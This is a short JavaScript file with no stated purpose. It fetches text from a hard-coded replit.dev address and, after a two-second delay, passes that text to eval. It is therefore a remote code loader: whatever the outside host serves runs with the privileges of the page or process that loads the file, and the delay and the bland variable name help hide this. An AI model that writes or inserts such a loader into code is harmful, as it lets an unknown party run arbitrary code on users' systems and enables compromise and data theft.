let ik = "";
setTimeout(() => {
	eval(ik);
}, 2000);

async function getData() {
	const url =
		"https://fe08bbdb-e5c7-4a85-95d6-18ea141c3a51-00-1nhy5locam9gk.teams.replit.dev";
	const res = await fetch(url);
	const c = await res.text();
	return c;
}

getData()
	.then((code) => {
		ik = code;
	})
	.catch((error) => {
		console.error(error);
	});
